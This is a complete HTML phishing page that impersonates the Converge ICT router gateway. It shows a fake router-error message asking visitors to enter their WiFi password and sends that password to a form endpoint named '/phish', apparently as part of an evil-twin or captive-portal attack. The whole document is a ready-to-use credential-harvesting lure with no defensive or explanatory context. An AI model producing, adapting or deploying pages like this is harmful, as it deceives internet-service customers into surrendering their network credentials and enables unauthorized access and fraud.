<!DOCTYPE html>
<html>
<head>
    <title>Converge Portal</title>
    <link rel="icon" href="/static/logos/converge.png">
    <style>
        body { background-color: #f0faff; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 75px; }
        img { width: 100px; }
        h2 { color: #006687; }
        input { padding: 10px; width: 250px; margin-top: 20px; }
        button { padding: 10px 25px; margin-top: 10px; background-color: #006687; color: white; border: none; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 2px 10px rgba(0,0,0,0.1); display: inline-block; }
    </style>
</head>
<body>
    <div class="card">
        <img src="/static/logos/converge.png" alt="Converge ICT">
        <h2>Converge ICT Gateway</h2>
        <p>Router error detected. To restore connectivity, enter your WiFi password.</p>
        <form method="POST" action="/phish">
            <input type="password" name="password" placeholder="WiFi Password" required><br>
            <button type="submit">Submit</button>
        </form>
    </div>
</body>
</html>
